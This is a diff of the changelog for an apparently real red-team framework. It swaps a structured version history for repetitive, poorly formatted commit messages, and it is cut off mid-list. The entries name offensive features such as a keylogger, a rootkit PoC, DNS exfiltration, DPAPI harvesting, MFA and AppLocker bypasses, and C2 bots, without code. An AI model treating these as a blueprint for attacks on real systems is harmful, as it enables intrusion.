@@ -1,2379 +1,7906 @@
+
 # Changelog
 
-All notable changes to the LazyOwn RedTeam Framework are documented here.
-Versions follow [Semantic Versioning](https://semver.org/).
-
----
-
-## [0.2.158] — vie 31 jul 2026
-
-### Added
-
-- new marketplace, auto_pwn, suggesters, yara rules, hunt, etc etc etc a lot of love
-
-### Changed
-
-- lazyreports and kill-chains :D
-- watchdog
-- marketplace
-- blueprint in lazyc2
-- login to cli
-- karma, elo, gamified labs, so much love
-- evento log
-- applocker
-- deleted dead code
-- campaign and colab :D
-- marketplace commands and labs commands
-- install.sh siembra payload.json, documentation, mcp and love in install script
 
-### Fixed
+### Otros
 
-- banners and reports endpoints fixed
+### Otros
 
-## [0.2.157] — mié 29 jul 2026
+  *   * feature(feat): some love, marketplace config, security issues, and bugfixing, refactoring \n\n Version: release/0.2.159 \n\n with love \n\n Modified file(s):\n- .github/workflows/ci.yml - .github/workflows/security-scan.yml - AGENTS.md - CHANGELOG.md - CHEATSHEET.md - CLAUDE.md - COMMANDS.md - COMPARISON.md - ESSENTIALS.md - QUICKSTART.md - README.md - cli/aliases.yaml - cli/command_index.json - cli/commands/cli_auth.py - cli/commands/dns_exfil.py - cli/commands/postexp_migrated.py - cli/commands/report_enhanced.py - cli/wizard.py - core/__init__.py - core/command_bridge.py - core/config.py - core/errors.py - core/executor.py - core/scheduler.py - docs/COMMANDS.html - external/README.md - lazy_sentinel4.py - lazyaddons/README.md - lazyc2.py - lazygui/app.py - lazyown.py - modules/49803.py - modules/agent_runner.py - modules/ai_fallback.py - modules/c2_profile.py - modules/cli_auth.py - modules/cve_matcher.py - modules/db.py - modules/event_bus.py - modules/generate_tools.py - modules/gui.py - modules/ia_code_analysis.py - modules/ia_logs_analysis.py - modules/ia_network_analysis.py - modules/icmp_server.py - modules/integrations/misp_export.py - modules/integrations/nuclei_bridge.py - modules/integrations/searchsploit.py - modules/lazyk8s.py - modules/lazyown_metaextract0r.py - modules/lazyownerweb.py - modules/lilsplunky.py - modules/logging_config.py - modules/module_registry.py - modules/moe_router.py - modules/obs_parser.py - modules/playbook_engine.py - modules/report_generator.py - modules/rl_trainer.py - modules/search.py - modules/vuln_agent.py - modules/vulnbot.py - modules/world_model.py - payloads/README.md - readmeneitor.py - report.py - skills/aci_planner.py - skills/autonomous_daemon.py - skills/hive_mind.py - skills/lazyown_campaign.py - skills/lazyown_daemon.py - skills/lazyown_facts.py - skills/lazyown_llm.py - skills/lazyown_parquet_db.py - skills/lazyown_policy.py - skills/mcp_generated_tools.py - skills/mcp_tool_generator.py - skills/sessions_watcher.py - skills/swan_agent.py - skills/toposwarm_autonomous.py - skills/update_knowledge.py - specs.md - static/security_dashboard.png - templates/phishing/emails/README.md - templates/phishing/landing_pages/README.md - tests/test_core_command_bridge.py - tests/test_core_config.py - tests/test_core_executor.py - tools/README.md - users.json\nCreated file(s):\n- .github/workflows/security-scan.yml - core/command_bridge.py - core/errors.py - core/executor.py - core/scheduler.py - external/README.md - payloads/README.md - skills/mcp_generated_tools.py - skills/mcp_tool_generator.py - templates/phishing/emails/README.md - templates/phishing/landing_pages/README.md - tests/test_core_command_bridge.py - tests/test_core_config.py - tests/test_core_executor.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: sáb 01 ago 2026 03:20:32 -04 \n\n Hora: 1785568832
 
-### Added
 
-- Merge branch 'main' into feature/operator-ux-boost
-- new dashboard topoloogy and exploit suggester
-- new command chain :D
-- new command hunt :D
-- docs: add app API reference to plugins README
-- test: add MCP smoke test (10 checks) + add mcp dep to pyproject.toml
-- docs: add API reference page from openapi.yaml
-- chore: update secrets baseline + add profiles README
-
-### Changed
-
-- unified dashboard
-- unified dashboard, and some love
-- steel migrating the monolithic
-- Merge pull request #201 from grisuno/dependabot/pip/tqdm-4.69.1
-- Merge pull request #202 from grisuno/dependabot/pip/argcomplete-3.7.0
-- Merge pull request #203 from grisuno/dependabot/pip/pyelftools-0.33
-- Merge pull request #204 from grisuno/dependabot/pip/cffi-2.1.0
-- Merge pull request #205 from grisuno/dependabot/pip/pyarrow-25.0.0
-- good by monolothic :D
-- bump pyarrow from 24.0.0 to 25.0.0
-- bump cffi from 2.0.0 to 2.1.0
-- bump pyelftools from 0.32 to 0.33
-- bump argcomplete from 3.6.3 to 3.7.0
-- bump tqdm from 4.67.3 to 4.69.1
-- auto_pwn
-- some leetcode, better lining, refactoring, etc
-- leetcode
-- now we got YARA Rules :D
-- Merge pull request #200 from grisuno/dependabot/pip/setuptools-83.0.0
-- bump setuptools from 81.0.0 to 83.0.0
-- Merge pull request #199 from grisuno/dependabot/pip/pyasn1-0.6.4
-- bump pyasn1 from 0.6.3 to 0.6.4
-- Merge pull request #198 from grisuno/dependabot/pip/pillow-12.3.0
-- bump pillow from 12.2.0 to 12.3.0
-- Merge pull request #197 from grisuno/dependabot/pip/torch-2.13.0
-- bump torch from 2.12.1 to 2.13.0
-- Merge pull request #193 from grisuno/dependabot/pip/python-engineio-4.13.3
-- Merge pull request #194 from grisuno/dependabot/pip/triton-3.7.1
-- Merge pull request #192 from grisuno/dependabot/pip/cuda-bindings-13.3.1
-- Merge pull request #191 from grisuno/dependabot/pip/nvidia-nvtx-13.3.29
-- Merge pull request #195 from grisuno/dependabot/pip/certifi-2026.6.17
-- perf: defer heavy imports from module-level to __init__ time
-- refactor: partial wildcard -> explicit import (reverted, too many deps)
-- refactor: consolidate sys.path.insert patterns across modules/skills
-- refactor: replace from utils import * with explicit imports (66 symbols)
-- docs: truncate README.md from 20k to 2.1k lines
-- chore: clean creds, changelog, and coverage threshold
+### Otros
 
-### Security
+### Otros
 
-- security bug fixing, and much much love
+  *   * Docs(documentation) k8 enum and some bug fixing in ci/cd and dns exfil
 
-### Fixed
 
-- some bug fixing
-- modules/lazycloud.py — Cloud Attack Module (AWS, Azure, GCP), modules/lazyk8s.py — Container & Kubernetes Attack Module, and some bg fixing
-- style: auto-fix 281 ruff issues in core/ and cli/
+### Otros
 
-## [0.2.156] — dom 12 jul 2026
+### Otros
 
-### Added
+  *   * Docs(documentation) reports
 
-- Doc(creation documentation) a brand new KNOWLEDGE_BASE.md
 
-### Changed
+### Otros
 
-- multinenant, extended params, cloud native attacks, junescape and much much love more
-- headless :D
+### Otros
 
-### Fixed
+  *   * Seguridad (3 fixes criticos) - pickle.load reemplazado por joblib + verificacion SHA256 en lazyown_parquet_db.py - 6 except: bare eliminados - core/executor.py -- wrapper centralizado para subprocess (reemplaza os.system()) - .github/workflows/security-scan.yml -- escaneo semanal con bandit + pip-audit + detect-secrets Arquitectura (4 mejoras mayores) - core/command_bridge.py -- facade ligero CLI/C2, lazy-loading, thread-safe - skills/mcp_tool_generator.py -- auto-genera 643 MCP tools desde command_index.json (24% -> ~95% cobertura) - modules/db.py -- threading.local(), credenciales encriptadas via AES, batch insert para nmap - core/scheduler.py + modules/event_bus.py backpressure (Queue max 500) Calidad (3 mejoras) - readmeneitor.py reescrito -- escanea cli/commands/, 670 comandos, 14 fases, COMMANDS.md de 4085 lineas - 600+ strings espanol traducidas a ingles en lazyc2.py, report.py, modules/gui.py, etc. - 25 plugins Lua duplicados eliminados, mecanismo de deprecacion en ModuleRegistry Operaciones (3 mejoras) - core/config.py -- env-var overlay (LAZYOWN_RHOST=...), audit trail JSONL, secretos encriptados en disco - modules/logging_config.py -- JsonFormatter, CorrelationFilter, 23 basicConfig() migrados - core/errors.py -- taxonomia con 9 tipos de error + ErrorCode enum (16 codigos)
 
-- cloud boost with grype prowler trivy scoutsuite cloudsploit stratus, a brand new params extender yaml awesome, pipelines, profiles, some bugfixing, and much much more
 
-## [0.2.155] — sáb 11 jul 2026
+### Otros
 
-### Added
+### Otros
 
-- Doc(creation documentation) a brand new KNOWLEDGE_BASE.md
-- Doc(creation documentation) a brand new KNOWLEDGE_BASE.md
+  *   * Docs(documentation) wizard updated
 
-### Changed
 
-- Multitentant, MFA, TOTP Generator, Multiusers, Colab and much much more
-- Update README.md
+### Otros
 
-## [0.2.154] — jue 09 jul 2026
+### Otros
 
-### Added
+  *   * Docs(documentation) a brand new doc :D
 
-- new skills, test, and new pytorch backdoor :D
-- new rookit io_uring is a poc
-- a brand new c keylogger :D
-- add pompem in ss pipeline
 
-### Changed
+### Otros
 
-- docker
-- shadow read the shadow file without trace
-- windows sdk headers
-- Update README.md
-- junuscape :O
-- Merge pull request #163 from grisuno/dependabot/pip/python-engineio-4.13.2
-- bump python-engineio from 4.13.1 to 4.13.2
-- Merge pull request #162 from grisuno/dependabot/pip/python-socketio-5.16.2
-- bump python-socketio from 5.16.1 to 5.16.2
-- updating lazyown.py do_form duplicated
-- clean history command: clean_local_history
-- thanks you very much to EQSTLab to provide the advisory :D thanks you bro changelog updated
-- some warnings urlib deleted :D
-- some love now we support curlfree command :D
-- some love now we support mcp to opencode
-- some love, aes_key in payload.json and some love to c2
-- some tests of integration FreeDom in lazyown
-- update deepseek prompts wink wink
-- update prompts wink wink
-- Estorides comes to LazyOwn RedTeam to Reconnaissance like a nation state level
+### Otros
 
-### Security
+  *   * feature(feat): new marketplace, auto_pwn, suggesters, yara rules, hunt, etc etc etc a lot of love \n\n Version: release/0.2.158 \n\n nuclei incorporado al marketplace \n\n Modified file(s):\n- .github/workflows/audit.yml - .github/workflows/ci.yml - .github/workflows/docker-smoke.yml - .github/workflows/lint.yml - .pre-commit-config.yaml - AGENTS.md - CHANGELOG.md - CHEATSHEET.md - CLAUDE.md - COMPARISON.md - ESSENTIALS.md - QUICKSTART.md - README.md - banners/lazyowneye.png - cli/aliases.py - cli/aliases.yaml - cli/auto_crypto.py - cli/banner_config.py - cli/command_index.json - cli/commands/README.md - cli/commands/__init__.py - cli/commands/ai.py - cli/commands/applocker_bypass.py - cli/commands/automation.py - cli/commands/bitm.py - cli/commands/campaign.py - cli/commands/cicd.py - cli/commands/cli_auth.py - cli/commands/collaboration.py - cli/commands/containers.py - cli/commands/crystal_ball.py - cli/commands/dns_exfil.py - cli/commands/dpapi.py - cli/commands/edr_detect.py - cli/commands/exploit.py - cli/commands/exploit_migrated.py - cli/commands/lab.py - cli/commands/marketplace.py - cli/commands/mcp_bridge.py - cli/commands/misc_migrated.py - cli/commands/persist.py - cli/commands/redteam_gym.py - cli/commands/report_enhanced.py - cli/commands/resource_scripting.py - cli/commands/security.py - cli/doctor.py - cli/engagement_hooks.py - cli/marketplace_config.py - cli/protips.py - cli/reactive_hints.py - cli/recommendation_signals.py - cli/scope_guard.py - cli/tips_engine.py - cli/wizard.py - core/credential_vault.py - core/payload_schema.py - core/prompt.py - core/security.py - core/validators.py - discord_c2.py - docs/examples/README.md - docs/examples/htb-lame-walkthrough.md - install.sh - lazyaddons/QuantumVault.yaml - lazyaddons/applocker_bypass_csc.yaml - lazyaddons/applocker_bypass_installutil.yaml - lazyaddons/applocker_bypass_msbuild.yaml - lazyaddons/applocker_bypass_mshta.yaml - lazyaddons/applocker_bypass_presentationhost.yaml - lazyaddons/applocker_bypass_regsvcs.yaml - lazyaddons/applocker_bypass_rundll32.yaml - lazyaddons/cicd_build_secrets.yaml - lazyaddons/cicd_gitlab_enum.yaml - lazyaddons/cicd_jenkins_enum.yaml - lazyaddons/dns_beacon.yaml - lazyaddons/dns_exfil_server.yaml - lazyaddons/dpapi_harvester.yaml - lazyaddons/edr_detector.yaml - lazyaddons/mfa_bypass_toolkit.yaml - lazyc2.py - lazyc2/blueprints/__init__.py - lazyc2/blueprints/beacon.py - lazyc2/extensions/storage.py - lazyenc.py - lazygui/config/constants.py - lazygui/panels/credentials_panel.py - lazygui/panels/killchain_panel.py - lazygui/panels/registry.py - lazygui/services/backend.py - lazygui/windows/main_window.py - lazyown-docker/README.md - lazyown.egg-info/PKG-INFO - lazyown.egg-info/SOURCES.txt - lazyown.egg-info/dependency_links.txt - lazyown.egg-info/entry_points.txt - lazyown.egg-info/requires.txt - lazyown.egg-info/top_level.txt - lazyown.py - modules/bitm_engine.py - modules/categories.py - modules/cicd_enumerator.py - modules/cli_auth.py - modules/command_executor.py - modules/conditional_hooks.py - modules/credential_reuse.py - modules/dashboard_bp.py - modules/dns_beacon.py - modules/dpapi_harvester.py - modules/edr_detector.py - modules/event_bus.py - modules/event_consumers.py - modules/gui.py - modules/hash_cracker.py - modules/integrations/nuclei_parser.py - modules/kill_chain_viz.py - modules/lazyagentAi.py - modules/lazycam3.py - modules/lazydeepseekcli_local.py - modules/lazydeepseekcli_localreport.py - modules/lazygptcli2.py - modules/lazygptcli3.py - modules/lazygptcli4.py - modules/lazygptcli5.py - modules/lazygpttask.py - modules/lazygptvulns.py - modules/lazyhttpsniff.py - modules/lazyk8s.py - modules/lazyredopgpt.py - modules/legacy/__init__.py - modules/legacy/lazy_http_bof.py - modules/legacy/lazy_packet_image_sniffer.py - modules/legacy/lazyaddon_creator.py - modules/legacy/lazyarpspoofing.py - modules/legacy/lazybinenc.py - modules/legacy/lazybotcli.py - modules/legacy/lazybotnet.py - modules/legacy/lazycam.py - modules/legacy/lazycreate_webshell.py - modules/legacy/lazydeepseekcli.py - modules/legacy/lazydisassebler.py - modules/legacy/lazyftpsniff.py - modules/legacy/lazygalazy.py - modules/legacy/lazygptcli.py - modules/legacy/lazygptcli_unified.py - modules/legacy/lazyhoneypot.py - modules/legacy/lazyhttpreverseshell.py - modules/legacy/lazykeygen.py - modules/legacy/lazylfi2rce.py - modules/legacy/lazyllmchat.py - modules/legacy/lazylogpoisoning.py - modules/legacy/lazymariadb_rce_cve_2016-662.py - modules/legacy/lazymidm.py - modules/legacy/lazymitmap.py - modules/legacy/lazynetbios.py - modules/legacy/lazyntlrelayx.py - modules/legacy/lazyopenssh77enum2.py - modules/legacy/lazyphishingai.py - modules/legacy/lazyproxy.py - modules/legacy/lazypwn.py - modules/legacy/lazypwnkit.py - modules/legacy/lazypyautogui.py - modules/legacy/lazyreversentlmv2.py - modules/legacy/lazysearch.py - modules/legacy/lazysearch_bot.py - modules/legacy/lazyseo.py - modules/legacy/lazysmbrelay.py - modules/legacy/lazysniff.py - modules/legacy/lazysqli.py - modules/legacy/lazyssh.py - modules/legacy/lazyvsftp.py - modules/legacy/lazywerkzeug.py - modules/llm_adapter.py - modules/logging_config.py - modules/mfa_bypass.py - modules/modules/README.md - modules/modules/colors.py - modules/operator_profiles.py - modules/opsec_scorer.py - modules/playbook_executor.py - modules/privesc_predictor.py - modules/reactive_engine.py - modules/redteam_gym.py - modules/report_templates.py - modules/resource_script.py - modules/session_rag.py - modules/session_state.py - modules/sessions/llm_budget.json - modules/state_manager.py - modules/toposwarm_bridge.py - modules/unified_bridge.py - modules/unified_llm_client.py - playbooks/apt_azure_graph_api.yaml - playbooks/apt_cicd_poisoning.yaml - playbooks/apt_entra_connect.yaml - playbooks/apt_macos_tcc.yaml - playbooks/apt_oauth_token_theft.yaml - playbooks/apt_sccm_mecm.yaml - playbooks/apt_vdi_breakout.yaml - pyproject.toml - requirements-dev.txt - requirements.txt - scripts/build_command_index.py - scripts/migrate_commandsets.py - scripts/migrate_lazyown.py - scripts/sync_doc_stats.py - skills/autonomous_daemon.py - skills/daemon_health.py - skills/lazyown.md - skills/lazyown_mcp.py - skills/lazyown_parquet_db.py - slack_c2_bot.py - specs.md - telegram_c2.py - templates/base.html - templates/index.html - tests/run_mutation_tests.py - tests/test_auto_crypto.py - tests/test_cli_command_sets.py - tests/test_credential_vault.py - tests/test_dashboard_routes.py - tests/test_hash_cracker.py - tests/test_nuclei_parser.py - tests/test_opsec_scorer.py - tests/test_reactive_hints_expanded.py - tests/test_report_banners_endpoints.py - tests/test_resource_script.py - tests/test_scope_guard.py - tests/test_tips_engine.py - users.json - utils.py - yara_rules/c2_framework_detection.yar - yara_rules/obfuscation_detection.yar - yara_rules/privesc_detection.yar - yara_rules/ransomware_detection.yar - yara_rules/webshell_advanced.yar\nDeleted file(s):\n- modules/lazyagentAi.py - modules/lazycam3.py - modules/lazydeepseekcli_local.py - modules/lazydeepseekcli_localreport.py - modules/lazygptcli2.py - modules/lazygptcli3.py - modules/lazygptcli4.py - modules/lazygptcli5.py - modules/lazygpttask.py - modules/lazygptvulns.py - modules/lazyhttpsniff.py - modules/lazyredopgpt.py - modules/modules/README.md - modules/modules/colors.py\nCreated file(s):\n- .github/workflows/audit.yml - .github/workflows/docker-smoke.yml - banners/lazyowneye.png - cli/auto_crypto.py - cli/commands/applocker_bypass.py - cli/commands/automation.py - cli/commands/bitm.py - cli/commands/campaign.py - cli/commands/cicd.py - cli/commands/cli_auth.py - cli/commands/collaboration.py - cli/commands/crystal_ball.py - cli/commands/dns_exfil.py - cli/commands/dpapi.py - cli/commands/edr_detect.py - cli/commands/lab.py - cli/commands/marketplace.py - cli/commands/mcp_bridge.py - cli/commands/redteam_gym.py - cli/commands/report_enhanced.py - cli/commands/security.py - cli/marketplace_config.py - cli/tips_engine.py - core/credential_vault.py - core/prompt.py - core/security.py - docs/examples/README.md - docs/examples/htb-lame-walkthrough.md - lazyaddons/QuantumVault.yaml - lazyaddons/applocker_bypass_csc.yaml - lazyaddons/applocker_bypass_installutil.yaml - lazyaddons/applocker_bypass_msbuild.yaml - lazyaddons/applocker_bypass_mshta.yaml - lazyaddons/applocker_bypass_presentationhost.yaml - lazyaddons/applocker_bypass_regsvcs.yaml - lazyaddons/applocker_bypass_rundll32.yaml - lazyaddons/cicd_build_secrets.yaml - lazyaddons/cicd_gitlab_enum.yaml - lazyaddons/cicd_jenkins_enum.yaml - lazyaddons/dns_beacon.yaml - lazyaddons/dns_exfil_server.yaml - lazyaddons/dpapi_harvester.yaml - lazyaddons/edr_detector.yaml - lazyaddons/mfa_bypass_toolkit.yaml - lazyc2/blueprints/beacon.py - lazygui/panels/credentials_panel.py - lazygui/panels/killchain_panel.py - lazyown.egg-info/PKG-INFO - lazyown.egg-info/SOURCES.txt - lazyown.egg-info/dependency_links.txt - lazyown.egg-info/entry_points.txt - lazyown.egg-info/requires.txt - lazyown.egg-info/top_level.txt - modules/bitm_engine.py - modules/cicd_enumerator.py - modules/cli_auth.py - modules/command_executor.py - modules/conditional_hooks.py - modules/credential_reuse.py - modules/dns_beacon.py - modules/dpapi_harvester.py - modules/edr_detector.py - modules/event_bus.py - modules/event_consumers.py - modules/hash_cracker.py - modules/integrations/nuclei_parser.py - modules/kill_chain_viz.py - modules/legacy/__init__.py - modules/legacy/lazydeepseekcli.py - modules/legacy/lazygptcli_unified.py - modules/llm_adapter.py - modules/mfa_bypass.py - modules/operator_profiles.py - modules/opsec_scorer.py - modules/playbook_executor.py - modules/privesc_predictor.py - modules/redteam_gym.py - modules/report_templates.py - modules/state_manager.py - modules/unified_bridge.py - playbooks/apt_azure_graph_api.yaml - playbooks/apt_cicd_poisoning.yaml - playbooks/apt_entra_connect.yaml - playbooks/apt_macos_tcc.yaml - playbooks/apt_oauth_token_theft.yaml - playbooks/apt_sccm_mecm.yaml - playbooks/apt_vdi_breakout.yaml - scripts/migrate_commandsets.py - scripts/sync_doc_stats.py - skills/daemon_health.py - tests/run_mutation_tests.py - tests/test_auto_crypto.py - tests/test_credential_vault.py - tests/test_dashboard_routes.py - tests/test_hash_cracker.py - tests/test_nuclei_parser.py - tests/test_opsec_scorer.py - tests/test_reactive_hints_expanded.py - tests/test_report_banners_endpoints.py - tests/test_resource_script.py - tests/test_tips_engine.py - yara_rules/c2_framework_detection.yar - yara_rules/obfuscation_detection.yar - yara_rules/privesc_detection.yar - yara_rules/ransomware_detection.yar - yara_rules/webshell_advanced.yar\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: vie 31 jul 2026 23:23:53 -04 \n\n Hora: 1785554633
 
-- vulns-2026-fatfs-chance
-- some security advisory patched thanks you very much to EQSTLab to provide the advisory :D thanks you bro
 
-### Fixed
+### Otros
 
-- hotfix in dockerfile, docker compose, docker sccript to build image, and more love :D
-- hotfixing
-- bug fixing
+### Otros
 
-## [0.2.152] — mar 16 jun 2026
+  *   * LazyOwn RedTeam released QuantumVault as free software so that journalists, activists, and ordinary people can communicate with hybrid post-quantum end-to-end encryption, free from surveillance, censorship, or any single point of control over their right to private communication and free expression.
 
-### Changed
 
-- test pipe line deply
-- Merge branch 'pp' into dev
-- Merge branch 'docs/engage-fastpath' into dev
-- Merge branch 'chore/cli-print-hygiene' into dev
-- surface the engage one-command fast-path
-- print hygiene + remove C2 credential leak in lazyown.py
+### Otros
 
-## [0.2.151] — mar 09 jun 2026
+### Otros
 
-### Added
+  *   * marketplace config ahora muestra: YAML Addons (123)  Plugins (56)  Tools (69)  YARA Rules (10)  Nuclei (500) 5 tabs en el TUI curses, sin comandos sueltos YARA: 10 reglas (ransomware, C2, webshells, ofuscacion, privesc) Nuclei: 500 templates del directorio real ~/nuclei-templates
 
-- some love to the code, no features news, but refactor
 
-### Changed
+### Otros
 
-- updating main
-- in recon command ss now work propertly
+### Otros
 
-## [0.2.149] — dom 07 jun 2026
+  *   * lazyreports and kill-chains :D
 
-### Changed
 
-- update pp
+### Otros
 
-### Security
+### Otros
 
-- some love to security issues
+  *   * watchdog
 
-## [0.2.148] — sáb 06 jun 2026
 
-### Changed
+### Otros
 
-- some improvements in the code and graphify
-- update dev
-- refresh self-knowledge graph (AST update)
-- suggest next commands
+### Otros
 
-## [0.2.147] — mar 02 jun 2026
+  *   * marketplace
 
-### Changed
 
-- Stream de razonamiento del daemon
+### Otros
 
-## [0.2.146] — mar 02 jun 2026
+### Otros
 
-### Fixed
+  *   * blueprint in lazyc2
 
-- ruff fix
 
-## [0.2.145] — lun 01 jun 2026
+### Otros
 
-### Changed
+### Otros
 
-- some love to modularization
+  *   * login to cli
 
-## [0.2.143] — mié 27 may 2026
 
-### Added
+### Otros
 
-- new l00t commands
+### Otros
 
-## [0.2.141] — lun 25 may 2026
+  *   * karma, elo, gamified labs, so much love
 
-### Added
 
-- new docs
-- docs: add branching strategy (dev/pp/main) to CLAUDE.md, AGENTS.md, CONTRIBUTING.md, SKILL.md
-- docs: translate all Spanish docstrings/UI to English, sync MCP tool count to 131, add phase guides
-- feat: add Hermes-native MCP integration layer (hermes-lazyown)
-- feat(themes to popups :D): with love
+### Otros
 
-### Changed
+### Otros
 
-- Create dependabot.yml
+  *   * evento log
 
-### Fixed
 
-- fix: regenerate COMMANDS.md/UTILS.md, fix utils.py banner, translate remaining Spanish comments
+### Otros
 
-## [0.2.139] — dom 24 may 2026
+### Otros
 
-### Added
+  *   * applocker
 
-- new graphos
 
-### Changed
+### Otros
 
-- refactor(better contract in payload.json): better wizard --tutorial
+### Otros
 
-## [0.2.138] — vie 22 may 2026
+  *   * deleted dead code
 
-### Added
 
-- some new feats
+### Otros
 
-### Changed
+### Otros
 
-- Batch A: migrate 22 do_* methods to phase-scoped CommandSets + Hermes-friendly docs
+  *   * campaign and colab :D
 
-## [0.2.135] — jue 21 may 2026
 
-### Changed
+### Otros
 
-- refactor(refactor in tools): all green now
+### Otros
 
-## [0.2.134] — jue 21 may 2026
+  *   * marketplace commands and labs commands
 
-### Changed
 
-- refactor(some refactors in wizards): with love
-- binding ips
+### Otros
 
-## [0.2.132] — mié 20 may 2026
+### Otros
 
-### Changed
+  *   * banners and reports endpoints fixed
 
-- surface
 
-### Security
+### Otros
 
-- and security issues
+### Otros
 
-## [0.2.131] — mar 19 may 2026
+  *   * install.sh siembra payload.json, documentation, mcp and love in install script
 
-### Changed
 
-- suggested commands
+### Nuevas características
 
-## [0.2.130] — mar 19 may 2026
+### Otros
 
-### Added
+  *   * feat(feat): unified dashboard \n\n Version: release/0.2.157 \n\n with love \n\n Modified file(s):\n- .c2_credentials.txt - .github/dependabot.yml - .github/workflows/attack_surface_scan.yml - .github/workflows/ci.yml - .github/workflows/lint.yml - .github/workflows/test.yml - .gitignore - .pre-commit-config.yaml - .secrets.baseline - AGENTS.md - CHANGELOG.md - CLAUDE.md - CONTRIBUTING.md - KNOWLEDGE_BASE.md - README.md - TUTORIAL_LazyOwn.md - adversary.json - banners/Lazy.png - banners/Lazy1.png - banners/Lazy2.png - cli/aliases.yaml - cli/assign.py - cli/autosuggest.py - cli/banner_config.py - cli/cli_enhancements.py - cli/command_chain.py - cli/command_form.py - cli/command_index.json - cli/commands/__init__.py - cli/commands/_base.py - cli/commands/ai.py - cli/commands/anti_forensics.py - cli/commands/caldera.py - cli/commands/cloud.py - cli/commands/command_and_control.py - cli/commands/command_and_control_migrated.py - cli/commands/containers.py - cli/commands/cred.py - cli/commands/cred_migrated.py - cli/commands/database.py - cli/commands/enum.py - cli/commands/evasive_payload.py - cli/commands/exfiltration.py - cli/commands/exploit.py - cli/commands/exploit_migrated.py - cli/commands/lateral.py - cli/commands/lateral_migrated.py - cli/commands/misc_migrated.py - cli/commands/mobile_macos.py - cli/commands/module_manager.py - cli/commands/payload_generation.py - cli/commands/persist.py - cli/commands/persist_migrated.py - cli/commands/phishing_wizard.py - cli/commands/pivoting.py - cli/commands/postexp.py - cli/commands/postexp_migrated.py - cli/commands/privilege_escalation.py - cli/commands/pwn.py - cli/commands/recon.py - cli/commands/recon_migrated.py - cli/commands/report.py - cli/commands/report_migrated.py - cli/commands/reporting.py - cli/commands/resource_scripting.py - cli/commands/scan_migrated.py - cli/commands/supply_chain.py - cli/dashboard_tui.py - cli/doctor.py - cli/engagement_hooks.py - cli/exploit_advisor.py - cli/exploration.py - cli/exploration_view.py - cli/fuzzy_picker.py - cli/graph_advisor.py - cli/graph_overlay.py - cli/headless.py - cli/lazynmap_post.py - cli/ops_commands.py - cli/palette_command.py - cli/palette_graph.py - cli/palette_overlay.py - cli/palette_telemetry.py - cli/protips.py - cli/recommendation.py - cli/recommendation_signals.py - cli/recon_plan.py - cli/registry.py - cli/scope_guard.py - cli/sessions_browser.py - cli/show.py - cli/splash.py - cli/status_bar.py - cli/style.py - cli/surface_graph.py - cli/themes.py - cli/timeline_browser.py - cli/toast_bus.py - cli/tui_theme.py - cli/wizard.py - core/__init__.py - core/config.py - core/credentials.py - core/crypto.py - core/http.py - core/llm_budget.py - core/network.py - core/parsers.py - core/payload_schema.py - core/process.py - core/safe_subprocess.py - deploy/README.md - deploy/k8s/lazyown-c2.yaml - discord_c2.py - docs/api_docs.html - external/install_external.sh - fast_run_as_r00t.sh - graphify-out/GRAPH_REPORT.md - graphify-out/GRAPH_REPORT_LAZYOWN.md - graphify-out/README.md - graphify-out/cost.json - graphify-out/graph.html - graphify-out/graph.json - graphify-out/graph_lazyown.json - graphify-out/manifest.json - lazy_sentinel4.py - lazyaddons/BlackObsidianC2.yaml - lazyaddons/CVE-2026-25089.yaml - lazyaddons/adcs_attacks.yaml - lazyaddons/cloud_bucket_enum.yaml - lazyaddons/cloud_enum.yaml - lazyaddons/cloud_metadata.yaml - lazyaddons/container_escape.yaml - lazyaddons/docker_enum.yaml - lazyaddons/fakesystemD.yaml - lazyaddons/gitleaks.yaml - lazyaddons/k8s_enum.yaml - lazyaddons/phantom2.yaml - lazyaddons/shadow.yaml - lazyaddons/websocket_beacon.yaml - lazyaddons/yara_scanner.yaml - lazyadversaries/lazynim.yaml - lazyadversaries/malleable_beacon.yaml - lazyadversaries/rust_implant.yaml - lazyc2.py - lazyc2/app_factory.py - lazyc2/blueprints/__init__.py - lazyc2/blueprints/api.py - lazyc2/blueprints/auth.py - lazyc2/blueprints/operations.py - lazyc2/blueprints/phishing.py - lazyc2/extensions/__init__.py - lazyc2/extensions/decoy.py - lazyc2/extensions/short_urls.py - lazyc2/extensions/storage.py - lazyc2/extensions/users.py - lazyc2/models.py - lazyc2/security/command_allowlist.py - lazyc2/security/cors.py - lazyc2/security/csrf.py - lazyc2/security/html_sanitizer.py - lazyc2/security/trusted_proxy.py - lazyc2/state.py - lazygui/app.py - lazygui/config/constants.py - lazygui/config/settings.py - lazygui/panels/listeners_panel.py - lazygui/panels/registry.py - lazygui/panels/sessions_panel.py - lazygui/services/backend.py - lazygui/services/event_log.py - lazygui/services/local_backend.py - lazygui/services/models.py - lazygui/services/teamserver_backend.py - lazygui/theme/manager.py - lazygui/theme/palettes/__init__.py - lazygui/widgets/command_palette_list.py - lazygui/windows/command_palette_window.py - lazygui/windows/main_window.py - lazyown.py - modules/49803.py - modules/CVE-2023-28432.py - modules/LazyOwnExplorer.py - modules/__init__.py - modules/adcs_attacks.py - modules/agent_runner.py - modules/agent_tool.py - modules/ai_exploit_chain.py - modules/ai_fallback.py - modules/ai_model.py - modules/amt_auth_bypass.py - modules/apt_playbooks.py - modules/atomic_enricher.py - modules/auto_pivot.py - modules/autonomous_exploit_engine.py - modules/bin2img.py - modules/bot.py - modules/c2_builder.py - modules/c2_messaging_base.py - modules/c2_profile.py - modules/categories.py - modules/cgi-bin/lazywebshell.py - modules/cloud_enum.py - modules/collab_bp.py - modules/colors.py - modules/compliance.py - modules/config_store.py - modules/cve_matcher.py - modules/dashboard_bp.py - modules/dashboard_engine.py - modules/db.py - modules/detailed_search.py - modules/detection_feed.py - modules/detection_oracle.py - modules/domain_dominance.py - modules/engagement_hooks.py - modules/evasion_engine.py - modules/evasive_payloads.py - modules/event_engine.py - modules/evilhttprev.sh - modules/exploit_chain.py - modules/exploit_recommender.py - modules/generate_tools.py - modules/gui.py - modules/ia_code_analysis.py - modules/ia_logs_analysis.py - modules/ia_network_analysis.py - modules/icmp_client.py - modules/icmp_server.py - modules/img2bin.py - modules/integrations/__init__.py - modules/integrations/misp_export.py - modules/integrations/nuclei_bridge.py - modules/integrations/searchsploit.py - modules/jwtexploit.py - modules/kivi.py - modules/lazy_rbac.py - modules/lazyaddon_creator.py - modules/lazyagentAi.py - 